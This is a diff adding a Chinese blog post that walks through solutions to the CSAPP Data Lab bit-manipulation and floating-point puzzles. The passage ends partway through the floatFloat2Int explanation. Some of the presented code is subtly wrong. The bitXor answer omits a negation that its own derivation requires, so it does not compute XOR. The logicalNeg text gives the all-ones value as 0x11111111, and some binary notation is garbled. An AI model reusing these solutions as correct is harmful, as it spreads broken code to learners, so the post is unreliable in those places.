@@ -46,6 +46,398 @@
       </tags>
   </entry>
   <entry>
+    <title>CSAPP-Lab01 Data Lab 记录</title>
+    <url>/2022/02/10/CSAPP-Lab01/</url>
+    <content><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/20200409205146245.png" alt="题目列表"></p>
+<h1 id="Problem-int"><a href="#Problem-int" class="headerlink" title="Problem-int"></a>Problem-int</h1><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><ul>
+<li>bitXor - x^y using only ~ and &amp; </li>
+<li>Example: bitXor(4, 5) &#x3D; 1</li>
+<li>Legal ops: ~ &amp;</li>
+<li>Max ops: 14</li>
+</ul>
+<p>要求只用“非”和“与”来表示“异或”。首先想到“异或的非&#x3D;同或”：<span id="more"></span><br>$$<br>\begin{aligned}x\oplus y&amp;&#x3D;\overline{x}y+x\overline{y}\newline<br>&amp;&#x3D;\overline{\overline{\overline{x}y}\cdot\overline{\overline{y}x}}\newline<br>&amp;&#x3D;\overline{(x+\overline{y})\cdot(\overline{x}+y)}\newline<br>&amp;&#x3D;\overline{xy+\overline{x}\overline{y}}<br>\end{aligned}<br>$$<br>将里面的“或”变成“和”，只需利用德摩根定律：<br>$$<br>\begin{aligned}<br>\overline{xy+\overline{x}\overline{y}}&#x3D;\overline{x\cdot y}\cdot\overline{\overline{x}\cdot\overline{y}}<br>\end{aligned}<br>$$</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> ~(x&amp;y)&amp;(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><ul>
+<li>tmin - return minimum two’s complement integer </li>
+<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
+<li>Max ops: 4</li>
+</ul>
+<p>对于32位int, Tmin &#x3D; 0x80000000, 将 1 左移31位即可</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><ul>
+<li>isTmax - returns 1 if x is the maximum, two’s complement number,</li>
+<li>and 0 otherwise </li>
+<li>Legal ops: ! ~ &amp; ^ | +</li>
+<li>Max ops: 10</li>
+</ul>
+<p>首先，我们知道 Tmax &#x3D; 0x7FFFFFFF, 不难想到求 Tmax+1 &#x3D; Tmin &#x3D; 0x80000000。观察可知，<code>~(Tmax+1) = Tmax</code>，只需判断 <code>~(x+1)</code> 与 x 是否相等即可得出结论。但是，题目要求不能用等于号，于是利用 x^x &#x3D; 0 的性质进行判断，即 <code>return !~(x+1)^x</code>。</p>
+<p>然而，这样是过不了的。仔细揣摩，-1 &#x3D; 0xFFFFFFFF。对其进行加1后，该操作数会被截断，高位进位无效，使得结果为0x00000000，每一位刚好也和-1的每一位互补。因此，x &#x3D; -1的情况是需要特判的。</p>
+<p>在C语言中，非0即为真。利用 x+1&#x3D;0 时结果为假这一特点，当 x &#x3D; -1 时，! (x+1) &#x3D; 1, 再用 ! (x+1) 与 原判式 !$ \sim $(x+1)^x 进行或运算，即 <code>(~(x+1)^x)|!(x+1)</code>, 则该式在 x &#x3D; -1 时一定为真，x !&#x3D; -1 时真假就一定取决于 <code>~(x+1)^x</code> 。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> !(~(x+<span class="number">1</span>)^x|!(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><ul>
+<li>allOddBits - return 1 if all odd-numbered bits in word set to 1</li>
+<li>where bits are numbered from 0 (least significant) to 31 (most significant)</li>
+<li>Examples allOddBits(0xFFFFFFFD) &#x3D; 0, allOddBits(0xAAAAAAAA) &#x3D; 1</li>
+<li>Legal ops: ! $ \sim $ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
+<li>Max ops: 12</li>
+</ul>
+<p>这道题本身是很简单的，很容易想到构造一个32位的奇数位全为1的数 y &#x3D; 0xAAAAAAAA，将其与 x 进行与运算，如果结果仍为 y, 则 x 的奇数位均为 1.</p>
+<p>但要注意本实验的一个要求：</p>
+<blockquote>
+<p>Integer constants 0 through 255 (0xFF), inclusive. You are not allowed to use big constants such as 0xffffffff.</p>
+</blockquote>
+<p>考虑先构造0xAA, 然后利用移位操作得到 0xAAAAAAAA。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="type">int</span> y = <span class="number">0xAA</span> + (<span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">	y = y + (y &lt;&lt; <span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> !((x&amp;y)^y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><ul>
+<li>negate - return -x </li>
+<li>Example: negate(1) &#x3D; -1.</li>
+<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
+<li>Max ops: 5</li>
+</ul>
+<p>很基础的结论： <code>~x + x = -1</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h2><ul>
+<li>isAsciiDigit - return 1 if 0x30 &lt;&#x3D; x &lt;&#x3D; 0x39 (ASCII codes for characters ‘0’ to ‘9’)</li>
+<li>Example: <ul>
+<li>isAsciiDigit(0x35) &#x3D; 1</li>
+<li>isAsciiDigit(0x3a) &#x3D; 0</li>
+<li>isAsciiDigit(0x05) &#x3D; 0</li>
+</ul>
+</li>
+<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
+<li>Max ops: 15</li>
+</ul>
+<p>0x30 &#x3D; 0…0 00</p>
+<p>11 0000</p>
+<p>0x39 &#x3D; 0…0 0011 1001</p>
+<ol>
+<li><p>先检查高26位是否全为0，作为条件1</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag1 = !(x &gt;&gt; <span class="number">6</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>再检查中间是否为0011，作为条件2</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag2 = !(<span class="number">0b11</span> ^ (x &gt;&gt; <span class="number">4</span>));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后检查末尾4位是否在0000与1001之间， 先得到最后四位数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> y = x &amp; (<span class="number">0xF</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>y 在 0 到 9 之间，则 y - 10 &lt; 0，由于符号限制，我们通过移位后判断符号位来作为条件3。由于不能用减法，可以通过<code>-x = ~x +1</code>达到目的</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag3 = (y + ~<span class="number">0xA</span> + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> (!(x &gt;&gt; <span class="number">6</span>)) &amp; (!(<span class="number">0b11</span> ^ (x &gt;&gt; <span class="number">4</span>))) &amp; (((x &amp; (<span class="number">0xF</span>)) + ~<span class="number">0xA</span> + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><ul>
+<li>conditional - same as x ? y : z </li>
+<li>Example: conditional(2,4,5) &#x3D; 4</li>
+<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
+<li>Max ops: 16</li>
+</ul>
+<p>这个题很基础<br>$$<br>F &#x3D; \overline xz+xy<br>$$<br>先将 x 归整化</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">x = !x</span><br></pre></td></tr></table></figure>
+
+<p>当 $x&#x3D;0$时， y &#x3D; 0x00000001, 考虑 $\sim y+1 &#x3D;$ 0xFFFFFFFF</p>
+<p>当 $x\neq0$时， y &#x3D; 0, 考虑 $~\sim(\sim y+1) &#x3D;$ 0xFFFFFFFF</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">	x = ~(!x)+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> (x&amp;z)+(~x&amp;y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><ul>
+<li>isLessOrEqual - if x &lt;&#x3D; y  then return 1, else return 0 </li>
+<li>Example: isLessOrEqual(4,5) &#x3D; 1.</li>
+<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
+<li>Max ops: 24</li>
+</ul>
+<p>考虑 x - y</p>
+<p>当 y 与 x 同号时，x - y 不会溢出，因此判断 x - y 的符号即可</p>
+<p>当 y 与 x 异号时，x - y 可能会溢出，这时只分别判断 y 和 x 的符号即可</p>
+<p>首先利用移位操作，分别得到 x, y 的符号位。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> signx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> signy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>设置情况flag1, x负 y正，满足情况，返回1；x正 y负，返回0</p>
+<table>
+<thead>
+<tr>
+<th align="center">正负</th>
+<th align="center">signx</th>
+<th align="center">signy</th>
+<th align="center">返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">x正 y负</td>
+<td align="center">0</td>
+<td align="center">1</td>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">x负 y正</td>
+<td align="center">1</td>
+<td align="center">0</td>
+<td align="center">1</td>
+</tr>
+</tbody></table>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag1 = signx &amp; (!signy)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>在x, y 同号的前提下</strong>，计算 x - y，也就是 <code>x+~y+1</code>, 移位取符号位。</p>
+<p>但是要注意到：x &#x3D; y 时，<code>x+~y+1 = 0</code>的符号位为0，与 x &lt; y 时的符号位为 1 不同，因此，x &#x3D; y 的情况需要特判。</p>
+<p>我在这里用了一种较为巧妙的办法，$x\leq y$ 等价于$x &lt;y + 1$ , 使x &#x3D; y + 1 时，符号位才为0，只需要将<code>x+ ~y+1</code>减 1 即可。</p>
+<p>即最终求 <code>x+~y</code> 的符号位。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> e = signx ^ signy; <span class="comment">//同号</span></span><br><span class="line"><span class="type">int</span> flag2 = ((!e) &amp; ((x + ~y) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">	<span class="type">int</span> signx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> signy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> flag1 = signx &amp; (!signy);</span><br><span class="line">	<span class="type">int</span> e = signx ^ signy; <span class="comment">//同号</span></span><br><span class="line">	<span class="type">int</span> flag2 = ((!e) &amp; ((x + ~y) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> flag1 | flag2;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
+
+<h2 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h2><ul>
+<li>logicalNeg - implement the ! operator, using all of </li>
+<li>the legal operators except !</li>
+<li>Examples: logicalNeg(3) &#x3D; 0, logicalNeg(0) &#x3D; 1</li>
+<li>Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
+<li>Max ops: 12</li>
+</ul>
+<p>当 x &#x3D; 0 时，-x &#x3D; 0，两者符号位相同，而当 $x\neq 0$ 时，-x 与 x 的符号位显然不同，由此就可以解决本题。</p>
+<p>令 x 与 -x 异或，则若 x &#x3D; 0, 则异或后的符号位为0，否则为1，取符号位作为结果，则得到的结果刚好与题目中要求的返回值相反。</p>
+<p>接下来要解决的问题就是实现 0x00000000 与 0x00000001 的相互转换，只需将其取反再加 2 即可</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> ~((((~ x + <span class="number">1</span>) | x) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>) + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>进一步优化：</strong>上述做法使用了 7 个操作符，总给人一种南辕北辙的感觉。原因在于没有利用算术右移的特点</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(~ x + <span class="number">1</span>) | x) &gt;&gt; <span class="number">31</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在这一步中，如果$x\neq 0$, 那么由于符号位为 1 ，右移后的结果便为0x11111111, 令其加 1 ，刚好为 0；显然，当 x &#x3D; 0 时，令结果加 1 ，刚好为 1 。于是，不需要“与”操作来置0高位，在移位完成后直接将结果加 1 ，便可过掉本题</p>
+<p>只用了 5 个操作符</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> (((~ x + <span class="number">1</span>) | x) &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h2><ul>
+<li>howManyBits - return the minimum number of bits required to represent x in</li>
+<li>two’s complement</li>
+<li>Examples: <ul>
+<li>howManyBits(12) &#x3D; 5</li>
+<li>howManyBits(298) &#x3D; 10</li>
+<li>howManyBits(-5) &#x3D; 4</li>
+<li>howManyBits(0)  &#x3D; 1</li>
+<li>howManyBits(-1) &#x3D; 1</li>
+<li>howManyBits(0x80000000) &#x3D; 32</li>
+</ul>
+</li>
+<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
+<li>Max ops: 90</li>
+</ul>
+<p><strong>题意理解</strong></p>
+<p>x 为正数，以八位为例：0011 1010，需找到最高位 1，除此以外，还需一位 0 作为符号位；</p>
+<p>x 为负数，以八位为例：1100 1001，需找到最高位 0，除此以外，还需更高一位 1 作为符号位</p>
+<p><strong>做法</strong></p>
+<ol>
+<li><p>为了统一，不妨当 x 为负数时，将其取反，如上例：$\sim $x &#x3D; 0011 0110, 那么也只需要找到最高位 1 后再加一位就好，这步操作如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">x = ((~flag) &amp; x) | (flag &amp; (~x));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用二分的思想，先考虑高16位：</p>
+<p><strong>0001 1000 1100 0000 | 0000 0100 1000 0000</strong></p>
+<p>将 x 右移16位 x &#x3D; x &gt;&gt; 16 ：</p>
+<p><strong>0000 0000 0000 0000 | 0001 1000 1100 0000</strong></p>
+<p>进行规格化处理 x &#x3D; !! x：</p>
+<p><strong>0000 0000 0000 0000 | 0000 0000 0000 0001</strong></p>
+<p>若高 16 位有 1，处理后的 x &#x3D; 0x00000001。需要的位数至少为 16，引入变量 bit_16 记录该权重。怎么做呢？将处理后的 x 左移 4 位即可</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> bit_16 = (!!(x &gt;&gt; <span class="number">16</span>)) &lt;&lt; <span class="number">4</span>; </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果高 16 位有 1 ，则将 x 右移 16 位，对右移后的 x 的低 16 位中的高 8 位进行同样的操作，从而二分地在 x 的高16位中找到最大位的 1 ；如果高 16 位没有 1 ，则 x 无需右移， 在 x 的低 16 位中的高 8 位进行同样的操作。</p>
+<p>由此可得右移操作：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">x = x &gt;&gt; bit_16;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>同理，分别对高 8 位，4位，2位，1位进行检查，检查后进行同样的操作。</p>
+</li>
+<li><p>最后将所有权重求和，便是最终结果</p>
+</li>
+</ol>
+<p><strong>举例</strong></p>
+<ul>
+<li><p>设 x &#x3D; 1101 1000 1100 0000 | 0000 0100 1000 0000</p>
+</li>
+<li><p>负数取反：y &#x3D; 0010 0111 0011 1111 | 1111 1011 0111 1111</p>
+</li>
+<li><p>高16位右移：y &#x3D; 0000 0000 0000 0000 | 0010 0111 0011 1111</p>
+</li>
+<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 0000 0001</p>
+</li>
+<li><p>bit_16 处理：bit_16 &#x3D; y &lt;&lt; 4 &#x3D; 16  &#x2F;&#x2F;说明 x 至少需要 16 位</p>
+</li>
+<li><p>x 右移：x &#x3D; x &gt;&gt; bit_16 &#x3D; 0000 0000 0000 0000 | 0010 0111 0011 1111</p>
+</li>
+<li><p>低 16 位中的高 8 位右移：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0010 0111</p>
+</li>
+<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 0001</p>
+</li>
+<li><p>bit_8 处理：bit_8 &#x3D; y &lt;&lt; 3 &#x3D; 8 &#x2F;&#x2F;说明 x 又需要 8 位</p>
+</li>
+<li><p>x 右移：x &#x3D; x &gt;&gt; bit_8 &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0010 0111</p>
+</li>
+<li><p>低 8 位的高 4 位右移：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 0010</p>
+</li>
+<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 0001</p>
+</li>
+<li><p>bit_4 处理：bit_4 &#x3D; y &lt;&lt; 2 &#x3D; 4 &#x2F;&#x2F;说明 x 又需要 4 位</p>
+</li>
+<li><p>x 右移：x &#x3D; x &gt;&gt; bit_4 &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 0010</p>
+</li>
+<li><p>低 4 位的高 2 位右移：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 00</p>
+</li>
+<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 00</p>
+</li>
+<li><p>bit_2 处理：bit_2 &#x3D; y &lt;&lt; 1 &#x3D; 0 &#x2F;&#x2F;说明 x 这 4 位中的 1 在低 2 位中 </p>
+</li>
+<li><p>x 右移：x &#x3D; x &gt;&gt; bit_2 &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 10 &#x2F;&#x2F;不移动</p>
+</li>
+<li><p>低 2 位的高 1 位右移：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 0 | 1</p>
+</li>
+<li><p>规格化：y &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 0 | 1</p>
+</li>
+<li><p>bit_1 处理：bit_1 &#x3D; y &lt;&lt; 0 &#x3D; 1 &#x2F;&#x2F;说明 x 又需要1位 </p>
+</li>
+<li><p>x 右移：x &#x3D; x &gt;&gt; bit_1 &#x3D; 0000 0000 0000 0000 | 0000 0000 | 0000 | 00 | 0 | 1 &#x2F;&#x2F;不移动</p>
+</li>
+<li><p>bit_0 处理：bit_0 &#x3D; x &#x3D; 1</p>
+</li>
+<li><p>bit_8 + bit_4 + bit_2 + bit_1 + bit_0 + 1&#x3D; 31 与正确答案符合！</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">	<span class="type">int</span> flag = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">	x = ((~flag) &amp; x) | (flag &amp; (~x));</span><br><span class="line">	<span class="type">int</span> bit_16 = (!!(x &gt;&gt; <span class="number">16</span>)) &lt;&lt; <span class="number">4</span>; </span><br><span class="line">	x = x &gt;&gt; bit_16;</span><br><span class="line">	<span class="type">int</span> bit_8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line">	x = x &gt;&gt; bit_8;</span><br><span class="line">  	<span class="type">int</span> bit_4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  	x = x &gt;&gt; bit_4;</span><br><span class="line">  	<span class="type">int</span> bit_2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  	x = x &gt;&gt; bit_2;</span><br><span class="line">  	<span class="type">int</span> bit_1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  	x = x &gt;&gt; bit_1;</span><br><span class="line">  	<span class="type">int</span> bit_0 = x;</span><br><span class="line">  	<span class="keyword">return</span> bit_16+bit_8+bit_4+bit_2+bit_1+bit_0+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Problem-float"><a href="#Problem-float" class="headerlink" title="Problem-float"></a>Problem-float</h1><h2 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h2><ul>
+<li>floatScale2 - Return bit-level equivalent of expression 2*f for</li>
+<li>floating point argument f.</li>
+<li>Both the argument and result are passed as unsigned int’s, but</li>
+<li>they are to be interpreted as the bit-level representation of</li>
+<li>single-precision floating point values.</li>
+<li>When argument is NaN, return argument</li>
+<li>Legal ops: Any integer&#x2F;unsigned operations incl. ||, &amp;&amp;. also if, while</li>
+<li>Max ops: 30</li>
+</ul>
+<p>先分别取符号 s，尾数 frac，和阶码 exp</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line"><span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>非规格化的</p>
+<p>此时，exp &#x3D;&#x3D; 0，由于此时 frac 就是尾码，直接 frac &lt;&lt; 1 即可</p>
+</li>
+<li><p>规格化的 </p>
+<p>此时，exp!&#x3D;0 &amp;&amp; ！&#x3D;255，exp ++即可</p>
+</li>
+<li><p>特殊值</p>
+<p>根据题目要求，返回 uf</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">	<span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);</span><br><span class="line">	<span class="comment">//NaN</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">exp</span> == <span class="number">0xFF</span>) </span><br><span class="line">		<span class="keyword">return</span> uf;</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">exp</span> == <span class="number">0</span>)&#123;</span><br><span class="line">		frac &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | frac;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//else</span></span><br><span class="line">	<span class="built_in">exp</span>++;</span><br><span class="line">	<span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | frac;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h2><ul>
+<li>floatFloat2Int - Return bit-level equivalent of expression (int) f</li>
+<li>for floating point argument f.</li>
+<li>Argument is passed as unsigned int, but</li>
+<li>it is to be interpreted as the bit-level representation of a</li>
+<li>single-precision floating point value.</li>
+<li>Anything out of range (including NaN and infinity) should return0x80000000u.</li>
+<li>Legal ops: Any integer&#x2F;unsigned operations incl. ||, &amp;&amp;. also if, while</li>
+<li>Max ops: 30</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220211212931907.png" alt="iEEE"></p>
+<p>与上题一样，先取符号 s，尾数 frac，和阶码 exp</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line"><span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>非规格化的</p>
+<p>此时，exp &#x3D;&#x3D; 0，而 E &#x3D; 1 - Bias &#x3D; 1 - 127 &#x3D; -126, M &lt; 1。显然，return 0</p>
+</li>
+<li><p>规格化的 </p>
+<p>此时，exp!&#x3D;0 &amp;&amp; exp！&#x3D;255。我们把 frac 作为基数进行修改，最后返回 frac 。首先由于这是规格化的，所以要加上开头的“1”。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> E = <span class="built_in">exp</span> - <span class="number">127</span>;</span><br><span class="line">frac = frac | (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br></pre></td></tr></table></figure>
+
+<p>$$<br>V &#x3D; (-1)^s\times M\times2^E<br>$$</p>
+<ul>
+<li><p>当 E &lt; 0 时，显然 V &lt; 1, return 0</p>
+</li>
+<li><p>frac 为 23 位，若 E &gt; 23, 则进行加权时，能在 frac 的末尾添加 (E - 23) 个 0</p>
+</li>
+<li><p>若 E &lt; 23, 则 frac 末尾的 (23 - E)个数无法保留</p>
+</li>
+<li><p>若 E &gt;&#x3D; 31, 显然为 infinity ，return 0x80000000u</p>
+</li>
+</ul>
+</li>
+<li><p>特殊值 exp &#x3D;&#x3D; 0xFF, return  0x80000000u</p>
+</li>
+<li><p>还要注意考虑负数的情况，根据 s 的值进行判断，最后利用我们前面用到的取负技巧即可。</p>
+</li>
+</ol>
